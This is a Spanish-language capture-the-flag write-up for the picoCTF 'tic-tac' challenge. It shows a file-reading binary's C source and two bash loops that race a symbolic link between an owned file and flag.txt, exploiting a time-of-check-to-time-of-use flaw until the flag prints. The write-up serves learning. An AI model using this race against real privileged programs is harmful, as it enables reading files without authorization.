# tic-tac

En este ejercicio nos dan las credenciales a una shell con un binario.

El binario tiene el siguiente código:

```c
#include <iostream>
#include <fstream>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    std::cerr << "Usage: " << argv[0] << " <filename>" << std::endl;
    return 1;
  }

  std::string filename = argv[1];
  std::ifstream file(filename);
  struct stat statbuf;

  // Check the file's status information.
  if (stat(filename.c_str(), &statbuf) == -1) {
    std::cerr << "Error: Could not retrieve file information" << std::endl;
    return 1;
  }

  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }

  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } else {
    std::cerr << "Error: Could not open file" << std::endl;
    return 1;
  }

  return 0;
}
```

Podemos ver que el programa imprime la un archivo (en este caso queremos que sea flag) por pantalla si llegamos hasta la parte final del código. Lo que pasa es que hay una condición que comprueba si somos el dueño del archivo y si no cierra el programa. Para poder solucionar este ejercicio tenemos que bypassear esa condición. Para eso podemos hacer lo siguiente:

Primero, cuando el flujo del programa esté comprobando quien es el dueño mandarle un archivo en donde seamos dueños. Segundo cuando acabe de comprobar, antes de que imprima el archivo que le pasemos, cambiar a flag.txt. Podemos hacer esto creando 2 scripts que estén en un bucle infinito y usando enlaces simbólicos de la siguiente forma:

```bash
# Script 1

while true; do
    ln -sf ./hola.txt enlace
    ln -sf ./flag.txt enlace
done
```

Este intercambia todo el rato el enlace intercambiándolo entre nuestro archivo y el real.

> Hay que crear de antemano el archivo hola.txt

```bash
# Script 2

while true; do
    ./txtreader enlace
done
```

Este ejecuta todo el rato el binario pasándole el enlace que va cambiando.

Eventualmente en alguna ejecución cuadrará en el momento justo el intercambio, consiguiendo así la flag:

```c
./ejecutar_programa.sh 
. . .
Error: you don't own this file
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_a5726c65}
Error: you don't own this file
Error: you don't own this file
. . .
```

Gracias por leer!
